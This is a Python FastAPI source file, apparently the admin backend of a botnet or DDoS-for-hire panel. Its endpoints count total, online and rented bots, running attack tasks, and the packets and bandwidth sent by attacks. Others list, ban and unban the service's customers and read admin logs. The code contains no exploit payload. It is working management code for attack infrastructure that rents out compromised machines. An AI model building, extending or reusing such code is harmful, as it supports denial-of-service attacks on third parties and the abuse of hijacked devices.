from fastapi import APIRouter, Depends, HTTPException
from typing import List
from uuid import UUID
from app.auth import get_current_admin
from app.models.all_models import User
from app.schemas.all_schemas import DashboardStats, UserOut
from app.database import async_session
from sqlalchemy import select, func
from app.models.all_models import Bot, AttackTask, User as UserModel, AdminLog

router = APIRouter(prefix="/api/admin", tags=["admin"])

@router.get("/stats", response_model=DashboardStats)
async def get_stats(admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        tb = (await s.execute(select(func.count(Bot.id)))).scalar() or 0
        ob = (await s.execute(select(func.count(Bot.id)).where(Bot.status == "online"))).scalar() or 0
        rb = (await s.execute(select(func.count(Bot.id)).where(Bot.is_rented == True))).scalar() or 0
        aa = (await s.execute(select(func.count(AttackTask.id)).where(AttackTask.status == "running"))).scalar() or 0
        tu = (await s.execute(select(func.count(UserModel.id)))).scalar() or 0
        tp = (await s.execute(select(func.coalesce(func.sum(AttackTask.total_packets), 0)))).scalar() or 0
        tby = (await s.execute(select(func.coalesce(func.sum(AttackTask.total_bytes), 0)))).scalar() or 0
    return DashboardStats(total_bots=tb, online_bots=ob, rented_bots=rb, active_attacks=aa, total_users=tu, total_packets=tp, total_bandwidth_gb=round(tby/1e9,2))

@router.get("/users", response_model=List[UserOut])
async def list_users(admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        r = await s.execute(select(UserModel).order_by(UserModel.created_at.desc()))
        return [UserOut.model_validate(u) for u in r.scalars().all()]

@router.post("/users/{user_id}/ban")
async def ban_user(user_id: UUID, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        user = (await s.execute(select(UserModel).where(UserModel.id == user_id))).scalar_one_or_none()
        if not user: raise HTTPException(404, "User not found")
        user.is_banned = True; await s.commit()
        return {"status": "banned"}

@router.post("/users/{user_id}/unban")
async def unban_user(user_id: UUID, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        user = (await s.execute(select(UserModel).where(UserModel.id == user_id))).scalar_one_or_none()
        if not user: raise HTTPException(404, "User not found")
        user.is_banned = False; await s.commit()
        return {"status": "unbanned"}

@router.get("/logs")
async def get_logs(limit: int = 100, admin: User = Depends(get_current_admin)):
    async with async_session() as s:
        r = await s.execute(select(AdminLog).order_by(AdminLog.created_at.desc()).limit(limit))
        return [{"id":l.id,"admin_id":str(l.admin_id),"action":l.action,"target_type":l.target_type,"target_id":str(l.target_id) if l.target_id else None,"details":l.details,"created_at":l.created_at.isoformat() if l.created_at else None} for l in r.scalars().all()]